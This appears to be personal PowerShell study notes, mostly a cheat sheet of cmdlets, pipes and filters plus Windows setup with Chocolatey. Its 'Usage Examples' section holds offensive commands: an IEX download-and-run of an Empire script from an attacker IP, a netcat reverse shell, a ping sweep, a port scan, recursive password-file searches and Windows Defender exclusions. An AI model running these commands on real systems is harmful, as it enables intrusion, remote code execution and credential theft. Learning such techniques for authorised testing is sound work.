
# 🤖 powershell

Tags: #🤖
Related to: 
See also: 
Previous: [[PROGRAMMING]]

## Description

Command-line shell and scripting language.

## Basics

Concept                     | What Does It Do? | What's a Handy Alias?
----------------------------|------------------------------------------------------|----------------------
Get-Help [cmdlet] -examples | Shows help and examples                              | help [cmdlet] -examples
Get-Command                 | Shows a list of commands                             | gcm \*[string]\*
Get-Member                  | Shows properties and methods                         | [cmdlet] \| gm
ForEach-Object {$_}         | Takes each item on the pipeline and handles it as $_ | [cmdlet] \| % {[cmdlet] $_}
Select-String                                      |Searches for strings in files or output, like grep                                      | sls -path [file] -pattern [string]

Powershell Cmdlet | Powershell Aliases | cmd.exe Command | Linux / Unix command
------------------|--------------------|-----------------|---------------------
Get-ChildItem     | ls, dir, gci       | dir             | ls
Copy-Item         | cp, copy, cpi      | copy            | cp
Move-Item         | mv, move, mi       | move            | mv
Select-String     | sls                | find, findstr   | grep
Get-Help          | man, help          | help            | man
Get-Content       | cat, type, gc      | type            | cat
Get-Process	      | ps, pgs            | tasklist        | ps
Get-Location      | pwd, gl            | cd (by itself)  | pwd
Get-Member        | gm

### Built-in variables

```shell-session
ls env:								// List environment variables.
ls variable:						// List all variables.

echo $home							// Display regular variable.
echo $env:PROCESSOR_ARCHITECTURE	// Display environment variable.
```

### cmdlet aliases

```shell-session
gcm										// Alias of Get-Command.
alias									// List all aliases.
help get-command						// Get alias of Get-Command.
get-alias -Definition Get-ChildItem		// Get list of aliases for Cmdlet.
```

### cmdlets

```shell-session
get-command set*		// Get a list of cmdlets that start with “set”.
get-command *process	// Get a list of cmdlets that end with “process”.

Common Verbs: Set-, Get-, New-, Read-, Find-, Start-
```

### Command flag shortening

For command flags, type only as much as you need to make it unambiguous.

```shell-session
ls -recurse
ls -rec
ls -r
```

### Counting loops

Echo 1 through 10.

```shell-session
1..10 | % {echo $_}
```

Conduct a ping sweep of all IPv4 addresses in the 10.10.10 network and go through the output to find the string ttl.

```shell-session
1..255 | % {ping -n 1 -w 100 10.10.10.$_ | select-string ttl}
```

### Display output

```shell-session
ls -r | Out-Host -paging	// Out-Host converts the output into a text stream. -paging makes it behave like “more”.
```

### Find files & directories

```shell-session
get-childitem -recurse [dir] [string] | % {echo $_.fullname}	// Find a file with [string] in its name.
ls -r [dir] [string] | % {echo $_.fullname}						// Simpler.
ls -r c:\windows hosts 2>$null | % {echo $_.fullname}			// Find hosts file.
```

### Interact with pipeline using ForEach-Object (%)

- Pipe another command's output to it, and it operates on each object passed down the pipeline.
- The current object is referred to as $_.
- Surround the item following the % in {}. You can have multiple commands inside the {} ... just separate them with semicolons.
- Remember that it provides objects, not necessarily strings

Examples:

```shell-session
ps -name nc | % {stop-process $_}	// Note: In older versions of Powershell (v2 in Win7), there is a bug in the way ps and stop-process interact.
									// Use this instead:
ps -name nc | stop-process
100, 200, 500 | % {$_ * 50}
```

### Getting help

```shell-session
help
help ps
help ps -detailed
help ps -examples
help ps -full
help ps- -online
```

### Pipes

When you use the | between cmdlets, you are NOT piping streams of textual data.

• You are piping objects.
• You don't have to parse. Instead, you pull out stuff you want.
• So, for example, the Get-Process (ps) cmdlet doesn't generate a list of processes; it generates a group of process objects you can pipe to other commands

```shell-session
ls | gm
```

### Using commands safely

```shell-session
Remove-Item *.txt -WhatIf	// What if: Performing the operation “Remove File” on target “<target>”.
```

### Select-Object

- Select-Object (alias “select”)
- Creates new objects from those passed down the pipeline, with a subset of properties.

Examples:

```shell-session
get-service | select servicename,displayname
get-service | select servicename,displayname | gm
```

### Select-String (sls)

Behaves like grep.

• -path indicates files
• -pattern indicates string/RegEx
• Case-insensitive by default; use -ca for case-sensitive

Examples:

#### Search through .txt files that contain the word “password" (case-insensitive).

	select-string -path c:\users\*.txt -pattern password

#### Recurse through directory to find all files that contain the word "password (case-insensitive).

	ls -r c:\users | % {select-string -path $_ -pattern password} 2>$null

### Select properties

Use format-list to create customized list of properties.

```shell-session
ps												// Show processes
ps | gm											// Show process properties and method names.
ps | format-list								// Show process summaries (ID, handles, CPU usage, name)
ps | format-list -property name, id, starttime	// Show custom list of process properties.
ps | format-list -property *					// Show all properties of each process.
```

### Tab autocomplete

You can navigate the Registry just like it was a part of your filesystem!

```shell-session
cd HKLM:\sys<Tab>
```

### Where-Object (?)

Where-Object (alias “?”)

- Filter object passed down the pipeline, based on properties.
- We don't have to parse with awk, sed, cut, FOR /F, and such like we would in other shells.
- Use comparisons such as -eq (equal), -ne (not equal), -like (like with * wildcard), -gt, -lt, etc.

Examples:

```shell-session
get-service | gm							// services have “status”
get-service | ? {$_.status -eq “running”}
```

- Note that for string comparisons, the -eq and -ne are case-insensitive.  
- Use -ceq and -cne for case-sensitive comparisons.

### Writing output

```shell-session
“hello”			// Display text.
3+6				// Do math.
1..10			// Make a range of numbers.
(1..10).count	// Count the number of objects in output.
(ls).count
```

## Usage Examples

### Execute remote code

IEX (Invoke Expression) runs commands or expressions on the local computer.

	powershell “IEX(New-Object Net.WebClient).downloadString('http://10.10.17.214/empire.ps1')”

Another method:

	(Invoke-WebRequest http://10.10.17.214/empire.ps1).Content | Invoke-Expression

### Find interesting files

#### Search directory recursively for .txt files with “password” in the file name. Display their path and contents.

	ls -r C:\wordpress *password*.txt | % {echo $_fullname; gc $_.fullname}

#### Search directory recursively for all files containing “password”. Print the file path and matching line.

	sls C:\wordpress\*config* -pattern password 2>$null

### Move a file using only PowerShell
#### Windows 8 (PowerShell v3)

	Invoke-WebRequest http://10.10.10.100/SEC560/netcat.zip -OutFile netcat.zip		// Alias wget

#### Windows 7 (PowerShell v2)

	(Net-Object System.Net.Webclient).DownloadFile("http://10.10.10.100/SEC560/netcat.zip","C:\netcat.zip")

### Ping sweep all IPv4 addresses and find the string ttl

	1..255 | % {ping -n 1 -w 100 10.10.10.$_ | select-string ttl}

### Portscan a target

	135..139 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) “Port $_ is open”} 2>$null

### Get reverse shell

Upload nc.exe to target:

	python3 -m http.server 80
	proxychains python3 exploit.py -u http://172.16.1.102/ -c "powershell wget 10.10.16.35/nc.exe -o nc.exe" -m 1111111111 -p test
	
Get shell:

	nc -lvnp 9001

	proxychains python3 exploit.py -u http://172.16.1.102/ -c "nc.exe -e cmd.exe 10.10.16.35 9001" -m 1111111111 -p test

### Port forward

Test on Windows only:

	1) run SERVER.EXE in cmd.exe.
	2) run nc.exe 127.0.0.1 4444 in another cmd.exe.

```
Dante Server 1.0
Enter Access Name: Admin
Access Password: P@$$worD
Correct Password!
```

Test between Kali and Windows:

In Windows powershell:

	netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3333 connectaddress=127.0.0.1 connectport=4444 protocol=tcp

```
The command forwards the connection from port 3333 on 0.0.0.0 to port 4444 on localhost, allowing us to access the  service. Let's validate the vulnerability by sending more than 1024 bytes of data in the password field.
```

Attacking machine:

	sudo ifconfig eth1 10.10.0.1
	sudo ifconfig eth1 netmask 255.255.255.0
	nc -nv 10.10.0.2 3333

```
Dante Server 1.0
Enter Access Name:
```

### Make typescript of terminal session

	Start-Transcript -Path "C:\Pentesting\03-21-2021-0200pm-exploitation.log"

```powershell-session
Transcript started, output file is C:\Pentesting\03-21-2021-0200pm-exploitation.log
```

	...SNIP...
	Stop-Transcript

### Redirect output

	.\custom-tool.ps1 10.129.28.119 > logs.custom-tool

	.\custom-tool.ps1 10.129.28.119 | Out-File -Append logs.custom-tool

### Update Windows

To keep with our command-line use, we will work at utilizing the command-line whenever possible. To start installing updates on our host, we will need the PSWindowsUpdate module. To acquire it, we will open an administrator Powershell window and issue the following commands:

#### Updates

	Get-ExecutionPolicy -List

```powershell-session
Scope ExecutionPolicy
----- ---------------
MachinePolicy Undefined
UserPolicy Undefined
Process Undefined
CurrentUser Undefined
LocalMachine Undefined 
```

We must first check our systems Execution Policy to ensure we can download, load, and run modules and scripts. The above command will show us a list output with the policy set for each scope. In our case, we do not want this change to be permanent, so we will only change the ExecutionPolicy for the scope of `Process`.

#### Execution Policy

	Set-ExecutionPolicy Unrestricted -Scope Process

```powershell-session
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. 
Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A

PS C:\htb> Get-ExecutionPolicy -List

Scope ExecutionPolicy
----- ---------------
MachinePolicy Undefined
UserPolicy Undefined
Process Unrestricted
CurrentUser Undefined
LocalMachine Undefined
```

Once we set our ExecutionPolicy, recheck it to make sure our change took effect. By changing the Process scope policy, we ensure our change is temporary and only applies to the current Powershell process. Changing it for any other scope will modify a registry setting and persist until we change it again.

Now that we have our ExecutionPolicy set, let us install the PSWindowsUpdate module and apply our updates. We can do so by:

#### PSWindowsUpdate

	Install-Module PSWindowsUpdate 

```powershell-session
Untrusted repository 
You are installing the modules from an untrusted repository. If you trust this repository, 
change its InstallationPolicy value by running the Set-PSRepository cmdlet. 
Are you sure you want to install the modules from 'PSGallery'?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A 
```

Once the module installation completes, we can import it and run our updates.

	Import-Module PSWindowsUpdate 
	Install-WindowsUpdate -AcceptAll

```powershell-session
X ComputerName Result KB Size Title
- ------------ ------ -- ---- -----
1 DESKTOP-3... Accepted KB2267602 510MB Security Intelligence Update for Microsoft Defender Antivirus - KB2267602...
1 DESKTOP-3... Accepted 17MB VMware, Inc. - Display - 8.17.2.14
2 DESKTOP-3... Downloaded KB2267602 510MB Security Intelligence Update for Microsoft Defender Antivirus - KB2267602...
2 DESKTOP-3... Downloaded 17MB VMware, Inc. - Display - 8.17.2.14 3 DESKTOP-3... Installed KB2267602 510MB Security Intelligence Update for Microsoft Defender Antivirus - KB2267602... 3 DESKTOP-3... Installed 17MB VMware, Inc. - Display - 8.17.2.14 

PS C:\htb> Restart-Computer -Force
```

The above Powershell example will import the `PSWindowsUpdate` module, run the update installer, and then reboot the PC to apply changes. Be sure to run updates regularly, especially if we plan to use this host frequently and not destroy it at the end of each engagement. Now that we have our updates installed let us get our package manager and other essential core tools.

### Download and use package manager

#### Chocolatey Package Manager

Chocolatey is a free and open software package management solution that can manage the installation and dependencies for our software packages and scripts. It also allows for automation with Powershell, Ansible, and several other management solutions. Chocolatey will enable us to install the tools we need from one source instead of downloading and installing each tool individually from the internet. Follow the Powershell windows below to learn how to install Chocolatey and use it to gather and install our tools.

	Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

```powershell-session
Forcing web requests to allow TLS v1.2 (Required for requests to Chocolatey.org)
Getting latest version of the Chocolatey package for download.
Not using proxy.
Getting Chocolatey from https://community.chocolatey.org/api/v2/package/chocolatey/0.10.15.
Downloading https://community.chocolatey.org/api/v2/package/chocolatey/0.10.15 to C:\Users\DEMONS~1\AppData\Local\Temp\chocolatey\chocoInstall\chocolatey.zip
Not using proxy.
Extracting C:\Users\DEMONS~1\AppData\Local\Temp\chocolatey\chocoInstall\chocolatey.zip to C:\Users\DEMONS~1\AppData\Local\Temp\chocolatey\chocoInstall
Installing Chocolatey on the local machine
Creating ChocolateyInstall as an environment variable (targeting 'Machine')
Setting ChocolateyInstall to 'C:\ProgramData\chocolatey'

...SNIP...

Chocolatey (choco.exe) is now ready.
You can call choco from the command-line or PowerShell by typing choco.
Run choco /? for a list of functions.
You may need to shut down and restart powershell and/or consoles
first prior to using choco.
Ensuring Chocolatey commands are on the path
Ensuring chocolatey.nupkg is in the lib folder
```

We have now installed chocolatey. The Powershell string we issued sets our ExecutionPolicy for the session and then downloads the installer from chocolatey.org and runs the script. Next, we will update chocolatey then start installing packages. To ensure no issues arise, it is recommended that we periodically restart our host.

	choco upgrade chocolatey -y 

```powershell-session
Chocolatey v0.10.15
Upgrading the following packages:
chocolatey
By upgrading, you accept licenses for the packages.
chocolatey v0.10.15 is the latest version available based on your source(s).

Chocolatey upgraded 0/1 packages.
See the log for details (C:\ProgramData\chocolatey\logs\chocolatey.log).
```

Now that we are sure chocolatey is up-to-date let us run our packages. We can use `choco` to install packages by issuing the `choco install pkg1 pkg2 pkg3` command listing out the package you need one by one separated by spaces. Alternatively, we can use a `packages.config` file for the installation. This is an XML file formatted so that chocolatey can install a list of packages. One helpful command to use is `choco info pkg`. It will show us various information about a package if it is available in the choco repository. See the [install page](https://docs.chocolatey.org/en-us/choco/commands/install) for more info on how to utilize chocolatey.

	choco info vscode 

```powershell-session
Chocolatey v0.10.15
vscode 1.55.1 [Approved]
Title: Visual Studio Code | Published: 4/9/2021
Package approved as a trusted package on Apr 09 2021 01:34:23.
Package testing status: Passing on Apr 09 2021 00:49:32.
Number of Downloads: 1999367 | Downloads for this version: 19751
Package url
Chocolatey Package Source: https://github.com/chocolatey-community/chocolatey-coreteampackages/tree/master/automatic/vscode
Package Checksum: 'fTzzpEG+cspu7FUdqMbj8EqaD8cRIQ/cXtAUv7JGVB9uc23vuGNiuceqM94irt+nx8MGM0xAcBwdwBH+iE+tgQ==' (SHA512)
Tags: microsoft visualstudiocode vscode development editor ide javascript typescript admin foss cross-platform
Software Site: https://code.visualstudio.com/
Software License: https://code.visualstudio.com/License
Software Source: https://github.com/Microsoft/vscode
Documentation: https://code.visualstudio.com/docs
Issues: https://github.com/Microsoft/vscode/issues
Summary: Visual Studio Code
Description: Build and debug modern web and cloud applications. Code is free and available on your favorite platform - Linux, Mac OSX, and Windows.
...SNIP...
```

Above is an example of using the info option with chocolatey.

	choco install python vscode git wsl2 openssh openvpn 

```powershell-session
Chocolatey v0.10.15
Installing the following packages:
python;vscode;git;wsl2;openssh;openvpn 
...SNIP... 

Chocolatey installed 20/20 packages.
See the log for details (C:\ProgramData\chocolatey\logs\chocolatey.log).

Installed:
- kb2919355 v1.0.20160915
- python v3.9.4
- kb3033929 v1.0.5
- chocolatey-core.extension v1.3.5.1
- kb2999226 v1.0.20181019
- python3 v3.9.4
- openssh v8.0.0.1
- vcredist2015 v14.0.24215.20170201
- gpg4win-vanilla v2.3.4.20191021
- vscode.install v1.55.1
- wsl2 v2.0.0.20210122
- kb2919442 v1.0.20160915
- openvpn v2.4.7
- git.install v2.31.1
- vscode v1.55.1
- vcredist140 v14.28.29913
- kb3035131 v1.0.3
- dotnet4.5.2 v4.5.2.20140902
- git v2.31.1
- chocolatey-windowsupdate.extension v1.0.4
```

	refresh env 

We can see in the terminal above that `choco` installed the packages we requested and pulled any dependencies required. Issuing the `refreshenv` command will update Powershell and any environment variables that were applied. Up to this point, we have our core tools installed. These tools will enable our operations. To install other packages, use the `choco install pkg` command to pull any operational tools we need. We have included a list of helpful packages that can aid us in completing a penetration test below. See the automation section further down to begin automating installing the tools and packages we commonly need and use.

### Add exemptions to Windows Defender

#### Windows Defender Exemptions for the Tools' Folders.

-   `C:\Users\your user here\AppData\Local\Temp\chocolatey\`
-   `C:\Users\your user here\Documents\git-repos\`
-   `C:\Users\your user here\Documents\scripts\`

These three folders are just a start. As we add more tools and scripts, we may need to add more exclusions. To exclude these files, we will run a PowerShell command.

#### Adding Exclusions

	Add-MpPreference -ExclusionPath "C:\Users\your user here\AppData\Local\Temp\chocolatey\"

Repeat the same steps for each folder we wish to exclude.

## Unsorted

### Get-WmiObject

#### Get Windows version and build number

We can use the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) [cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7) to find information about the operating system. This cmdlet can be used to get instances of WMI classes or information about available WMI classes. There are a variety of ways to find the version and build number of our system. We can easily obtain this information using the `win32_OperatingSystem` class, which shows that we are on a Windows 10 host, build number 19041.

	Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber

```powershell-session
Version    BuildNumber
-------    -----------
10.0.19041 19041
```

Some other useful classes that can be used with `Get-WmiObject` are `Win32_Process` to get a process listing, `Win32_Service` to get a listing of services `Win32_Bios` to get BIOS information. We can use the `ComputerName` parameter to get information about remote computers. `GetWmiObject` can be used to start and stop services on local and remote computers, and more. Further information about the cmdlet can be found [here](https://ss64.com/ps/get-wmiobject.html) and [here](https://adamtheautomator.com/get-wmiobject/).

# References